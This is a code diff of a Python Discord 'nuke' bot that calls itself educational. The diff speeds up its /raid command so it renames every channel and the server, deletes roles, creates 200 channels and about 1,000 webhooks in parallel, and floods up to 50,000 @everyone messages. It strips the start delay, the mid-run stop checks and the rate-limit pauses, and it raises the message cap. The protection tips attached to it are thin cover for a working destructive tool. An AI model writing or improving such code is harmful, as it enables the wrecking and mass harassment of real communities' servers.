@@ -15,15 +15,14 @@ active_demo = {}
 @bot.event
 async def on_ready():
     await bot.tree.sync()
-    print(f"✅ Educational Demo Bot ready - {bot.user}")
-    print(f"⚠️ This bot is for EDUCATIONAL PURPOSES only")
+    print(f"✅ FAST Educational Demo Bot ready - {bot.user}")
 
-@bot.tree.command(name="raid", description="[OWNER ONLY] Realistic educational nuke demonstration")
+@bot.tree.command(name="raid", description="[OWNER ONLY] ULTRA-FAST educational nuke")
 async def raid(
     interaction: discord.Interaction,
-    message: str = "⚠️ THIS SERVER HAS BEEN NUKED ⚠️ | discord.gg/example | CONTACT OWNER IMMEDIATELY",
+    message: str = "⚠️ THIS SERVER HAS BEEN NUKED ⚠️",
     ping: str = "yes",
-    amount: int = 100
+    amount: int = 5000
 ):
     if interaction.user.id != OWNER_ID:
         return await interaction.response.send_message("❌ Only the bot owner can run this.", ephemeral=True)
@@ -31,165 +30,136 @@ async def raid(
     if not interaction.guild.me.guild_permissions.administrator:
         return await interaction.response.send_message("❌ Bot needs Administrator permission.", ephemeral=True)
     
-    # Acknowledge
-    await interaction.response.send_message("⚠️ **EDUCATIONAL DEMO STARTING IN 5 SECONDS** - This is what a real nuke looks like", ephemeral=False)
-    await asyncio.sleep(5)
+    await interaction.response.send_message(f"⚡ **ULTRA-FAST EDUCATIONAL DEMO STARTING**\nSending {amount} messages instantly...", ephemeral=False)
     
     ping_enabled = ping.lower() in ['yes', 'y', 'true', '1']
-    msg_amount = min(amount, 10000)  # Max 10,000 messages
+    msg_amount = min(amount, 50000)
+    ping_text = "@everyone " if ping_enabled else ""
     
     guild = interaction.guild
     active_demo[guild.id] = True
     
-    # Create a log channel to show progress
-    log_channel = None
-    try:
-        overwrites = {
-            guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
-        }
-        log_channel = await guild.create_text_channel("🔴-NUKED-BY-DEMO", overwrites=overwrites)
-        await log_channel.send("💀 **EDUCATIONAL NUKE DEMO IN PROGRESS** 💀")
-        await log_channel.send("This is what a malicious nuke bot does to a server.")
-        await log_channel.send("Watch closely to understand why you should NEVER give Admin to untrusted bots.")
-    except:
-        pass
+    # Create log channel
+    log_channel = await guild.create_text_channel("🔴-NUKED-BY-DEMO")
+    await log_channel.send("💀 **ULTRA-FAST EDUCATIONAL NUKE DEMO** 💀")
     
     try:
-        # ========== PHASE 1: Rename all existing channels ==========
-        if log_channel:
-            await log_channel.send("📢 **PHASE 1: Renaming all channels...**")
+        # ========== PARALLEL CHANNEL RENAMING ==========
+        await log_channel.send("📢 Renaming all channels...")
+        rename_tasks = [channel.edit(name="nuked-by-demo") for channel in guild.channels if channel != log_channel]
+        await asyncio.gather(*rename_tasks, return_exceptions=True)
         
-        for channel in guild.channels:
-            if not active_demo.get(guild.id):
-                break
-            if channel == log_channel:
-                continue
+        # ========== SERVER RENAME ==========
+        await guild.edit(name="🔥 NUKED BY DEMO 🔥")
+        
+        # ========== PARALLEL ROLE DELETION ==========
+        await log_channel.send("📢 Destroying roles...")
+        delete_tasks = [role.delete() for role in guild.roles if not role.is_default() and not role.managed and role != guild.me.top_role]
+        await asyncio.gather(*delete_tasks, return_exceptions=True)
+        
+        # ========== CREATE 200 CHANNELS + WEBHOOKS SIMULTANEOUSLY ==========
+        await log_channel.send("📢 Creating 200 channels with webhooks simultaneously...")
+        
+        CHANNEL_COUNT = 200
+        WEBHOOKS_PER_CHANNEL = 5
+        
+        # Create all channels in parallel
+        create_tasks = [guild.create_text_channel(f"nuked-{i}") for i in range(CHANNEL_COUNT)]
+        channels = await asyncio.gather(*create_tasks, return_exceptions=True)
+        spam_channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]
+        
+        await log_channel.send(f"✅ Created {len(spam_channels)} channels")
+        
+        # Create webhooks for ALL channels in parallel (no waiting)
+        await log_channel.send(f"📢 Creating {len(spam_channels) * WEBHOOKS_PER_CHANNEL} webhooks simultaneously...")
+        
+        all_webhooks = []
+        webhook_tasks = []
+        for channel in spam_channels:
+            for w in range(WEBHOOKS_PER_CHANNEL):
+                webhook_tasks.append(channel.create_webhook(name=f"spammer_{w}"))
+        
+        # Create all webhooks in parallel batches
+        batch_size = 50
+        for i in range(0, len(webhook_tasks), batch_size):
+            batch = webhook_tasks[i:i+batch_size]
+            results = await asyncio.gather(*batch, return_exceptions=True)
+            all_webhooks.extend([r for r in results if isinstance(r, discord.Webhook)])
+        
+        await log_channel.send(f"✅ Created {len(all_webhooks)} webhooks")
+        
+        # ========== INSTANT SPAM - ALL CHANNELS + WEBHOOKS SIMULTANEOUSLY ==========
+        await log_channel.send(f"⚡ INSTANTLY spamming {msg_amount} messages across all channels/webhooks...")
+        
+        # Prepare message texts
+        all_message_texts = [f"{ping_text}{message} [{i+1}/{msg_amount}]" for i in range(msg_amount)]
+        
+        # Function to spam via webhook
+        async def spam_via_webhook(webhook, messages):
             try:
-                await channel.edit(name="nuked-by-demo")
-                await asyncio.sleep(0.1)
+                for msg in messages:
+                    await webhook.send(msg)
             except:
                 pass
         
-        # ========== PHASE 2: Rename the server ==========
-        if log_channel:
-            await log_channel.send("📢 **PHASE 2: Renaming server...**")
-        
-        try:
-            await guild.edit(name="🔥 NUKED BY DEMO 🔥")
-        except:
-            pass
-        
-        # ========== PHASE 3: Delete all roles ==========
-        if log_channel:
-            await log_channel.send("📢 **PHASE 3: Destroying all roles...**")
-        
-        for role in guild.roles:
-            if not active_demo.get(guild.id):
-                break
-            if role.is_default() or role.managed or role == guild.me.top_role:
-                continue
+        # Function to spam via channel
+        async def spam_via_channel(channel, messages):
             try:
-                await role.delete()
-                await asyncio.sleep(0.1)
+                for msg in messages:
+                    await channel.send(msg)
             except:
                 pass
         
-        # ========== PHASE 4: Create 100 spam channels ==========
-        if log_channel:
-            await log_channel.send("📢 **PHASE 4: Creating 100 spam channels...**")
-        
-        spam_channels = []
-        for i in range(100):
-            if not active_demo.get(guild.id):
-                break
-            try:
-                channel = await guild.create_text_channel(f"nuked-by-demo-{i}")
-                spam_channels.append(channel)
-                await asyncio.sleep(0.2)
-            except:
-                pass
-        
-        if log_channel:
-            await log_channel.send(f"✅ Created {len(spam_channels)} spam channels")
-        
-        # ========== PHASE 5: Create webhooks in every channel ==========
-        if log_channel:
-            await log_channel.send("📢 **PHASE 5: Creating webhooks for spam...**")
-        
-        webhooks = []
-        for channel in spam_channels[:50]:  # Limit to 50 channels to avoid rate limits
-            if not active_demo.get(guild.id):
-                break
-            try:
-                for i in range(3):
-                    wh = await channel.create_webhook(name=f"spammer_{i}")
-                    webhooks.append(wh)
-                    await asyncio.sleep(0.2)
-            except:
-                pass
-        
-        # ========== PHASE 6: Send spam messages (up to 10,000) ==========
-        if log_channel:
-            await log_channel.send(f"📢 **PHASE 6: Sending {msg_amount} spam messages with ping={'ON' if ping_enabled else 'OFF'}...**")
-        
-        ping_text = "@everyone " if ping_enabled else ""
-        
-        # Send via webhooks (bypasses rate limits better)
-        for channel in spam_channels[:30]:  # Focus on first 30 channels
-            if not active_demo.get(guild.id):
-                break
+        # Distribute messages across ALL channels and webhooks
+        total_targets = len(spam_channels) + len(all_webhooks)
+        if total_targets > 0:
+            messages_per_target = msg_amount // total_targets + 1
             
-            for i in range(min(msg_amount // 30, 100)):  # Distribute messages
-                if not active_demo.get(guild.id):
-                    break
-                try:
-                    # Get or create a webhook for this channel
-                    channel_webhooks = [wh for wh in webhooks if wh.channel_id == channel.id]
-                    if channel_webhooks:
-                        await channel_webhooks[0].send(f"{ping_text}{message} [{i+1}/{msg_amount//30}]")
-                    else:
-                        await channel.send(f"{ping_text}{message} [{i+1}/{msg_amount//30}]")
-                    await asyncio.sleep(0.1)
-                except:
-                    pass
+            spam_tasks = []
+            
+            # Spam via channels
+            for idx, channel in enumerate(spam_channels):
+                start = idx * messages_per_target
+                end = min(start + messages_per_target, msg_amount)
+                if start < msg_amount:
+                    spam_tasks.append(spam_via_channel(channel, all_message_texts[start:end]))
+            
+            # Spam via webhooks
+            for idx, webhook in enumerate(all_webhooks):
+                start = (len(spam_channels) + idx) * messages_per_target
+                end = min(start + messages_per_target, msg_amount)
+                if start < msg_amount:
+                    spam_tasks.append(spam_via_webhook(webhook, all_message_texts[start:end]))
+            
+            # Execute ALL spam simultaneously
+            await asyncio.gather(*spam_tasks, return_exceptions=True)
         
-        # Also spam in the log channel
-        for i in range(min(msg_amount // 10, 50)):
-            if not active_demo.get(guild.id):
-                break
-            try:
-                await log_channel.send(f"{ping_text}💀 {message} 💀")
-                await asyncio.sleep(0.1)
-            except:
-                pass
+        await log_channel.send(f"✅ Successfully spammed {msg_amount} messages!")
         
-        # ========== PHASE 7: Send final educational summary ==========
+        # ========== FINAL SUMMARY ==========
         embed = discord.Embed(
             title="💀 EDUCATIONAL NUKE DEMO COMPLETE 💀",
-            description=f"**What just happened to this server:**\n\n"
-                       f"🔥 **1. Channels Renamed** - All {len(guild.channels)} channels renamed to 'nuked-by-demo'\n"
-                       f"📛 **2. Server Renamed** - Server name changed\n"
-                       f"👑 **3. Roles Destroyed** - All admin/mod roles deleted\n"
-                       f"📁 **4. Spam Channels** - {len(spam_channels)} new channels created\n"
-                       f"🕸️ **5. Webhooks Created** - Used to bypass rate limits\n"
-                       f"💬 **6. Mass Pinging** - {msg_amount} messages sent with {'@everyone' if ping_enabled else 'no pings'}\n\n"
-                       f"**🚨 HOW TO PROTECT YOUR REAL SERVER:**\n"
+            description=f"**What just happened in SECONDS:**\n\n"
+                       f"⚡ **1. Channels Renamed** - All original channels wiped\n"
+                       f"⚡ **2. Server Renamed** - Name changed instantly\n"
+                       f"⚡ **3. Roles Destroyed** - All protections removed\n"
+                       f"⚡ **4. {len(spam_channels)} Spam Channels** - Created instantly\n"
+                       f"⚡ **5. {len(all_webhooks)} Webhooks** - Created in parallel\n"
+                       f"⚡ **6. {msg_amount} Spam Messages** - Sent simultaneously\n"
+                       f"⚡ **7. @everyone Pings** - {'ENABLED' if ping_enabled else 'DISABLED'}\n\n"
+                       f"**🚨 REAL ATTACKS HAPPEN THIS FAST - PROTECT YOUR SERVER:**\n"
                        f"• ✅ NEVER give Administrator to untrusted bots\n"
                        f"• ✅ Use 2FA on all admin accounts\n"
                        f"• ✅ Set verification level to HIGH\n"
-                       f"• ✅ Use backup bots (Xenon) to save server structure\n"
-                       f"• ✅ Regularly audit bot permissions\n"
-                       f"• ✅ Create a 'emergency stop' role with channel creation permissions\n\n"
-                       f"**⚠️ This was an EDUCATIONAL DEMO. Your real server is NOT affected.**\n"
-                       f"**To clean up, delete this test server or restore from backup.**",
+                       f"• ✅ Use backup bots (Xenon) to save your server\n"
+                       f"• ✅ Audit bot permissions weekly\n\n"
+                       f"**⚠️ This was an EDUCATIONAL DEMO**\n"
+                       f"Delete this test server to clean up.",
             color=discord.Color.red()
         )
+        await log_channel.send(embed=embed)
         
-        if log_channel:
-            await log_channel.send(embed=embed)
-        
-        # Also try to DM the owner
+        # DM owner
         try:
             owner = await bot.fetch_user(OWNER_ID)
             await owner.send(embed=embed)
@@ -197,8 +167,7 @@ async def raid(
             pass
         
     except Exception as e:
-        if log_channel:
-            await log_channel.send(f"❌ Demo error: {e}")
+        await log_channel.send(f"❌ Error: {e}")
     finally:
         active_demo[guild.id] = False
 
@@ -213,57 +182,44 @@ async def stopraid(interaction: discord.Interaction):
     else:
         await interaction.response.send_message("No active demo.", ephemeral=True)
 
-@bot.tree.command(name="protect", description="How to protect your server from nuke bots")
+@bot.tree.command(name="protect", description="How to protect your server")
 async def protect(interaction: discord.Interaction):
     embed = discord.Embed(
-        title="🛡️ How to Protect Your Server",
+        title="🛡️ How to Protect Your Server from Nuke Bots",
         description="Educational security guide",
         color=discord.Color.green()
     )
     embed.add_field(name="1. NEVER give Admin to untrusted bots", 
-                    value="Review bot permissions before inviting. Most nuke bots request Administrator.", 
-                    inline=False)
+                    value="Review permissions before inviting any bot.", inline=False)
     embed.add_field(name="2. Enable 2FA", 
-                    value="All administrator accounts should have 2FA enabled.", 
-                    inline=False)
+                    value="All administrator accounts must have 2FA.", inline=False)
     embed.add_field(name="3. Server Verification Level", 
-                    value="Set to 'High' (member must be registered for 10+ minutes).", 
-                    inline=False)
+                    value="Set to HIGH (member must be registered for 10+ minutes).", inline=False)
     embed.add_field(name="4. Use Backup Bots", 
-                    value="Xenon and similar bots can save/restore your server structure.", 
-                    inline=False)
+                    value="Xenon can save/restore your entire server structure.", inline=False)
     embed.add_field(name="5. Audit Logs", 
-                    value="Regularly check Audit Logs for mass channel creation.", 
-                    inline=False)
-    embed.add_field(name="6. Create an Emergency Plan", 
-                    value="Have a role with 'Manage Channels' to stop raids quickly.", 
-                    inline=False)
-    embed.set_footer(text="Educational purposes only")
+                    value="Check audit logs regularly for mass channel creation.", inline=False)
+    embed.set_footer(text="Educational purposes only - Stay safe!")
     
     await interaction.response.send_message(embed=embed, ephemeral=False)
 
 @bot.tree.command(name="commands", description="Show all commands")
 async def cmd_list(interaction: discord.Interaction):
     embed = discord.Embed(
-        title="Educational Nuke Demo Bot",
-        description="⚠️ For EDUCATIONAL purposes only - run on TEST servers",
+        title="⚡ FAST Educational Nuke Demo Bot",
+        description="Ultra-fast demonstration for educational purposes",
         color=discord.Color.blue()
     )
     embed.add_field(name="/raid [message] [ping] [amount]", 
-                    value="Start realistic nuke demonstration\n"
-                          "• `message` - Custom spam text\n"
-                          "• `ping` - yes/no for @everyone\n"
-                          "• `amount` - Messages to send (1-10000)", 
+                    value="Start ULTRA-FAST nuke demonstration\n"
+                          "• Creates 200 channels + webhooks simultaneously\n"
+                          "• Spams thousands of messages instantly\n"
+                          "• Shows why you should NEVER give Admin to untrusted bots", 
                     inline=False)
-    embed.add_field(name="/stopraid", 
-                    value="Emergency stop the demo", 
-                    inline=False)
-    embed.add_field(name="/protect", 
-                    value="Show protection guide", 
-                    inline=False)
-    embed.add_field(name="/commands", 
-                    value="Show this help", 
-                    inline=False)
+    embed.add_field(name="/stopraid", value="Emergency stop", inline=False)
+    embed.add_field(name="/protect", value="Show protection guide", inline=False)
+    embed.add_field(name="/commands", value="Show this help", inline=False)
+    embed.set_footer(text="⚠️ EDUCATIONAL ONLY - Run on test servers")
     
     await interaction.response.send_message(embed=embed, ephemeral=False)
 
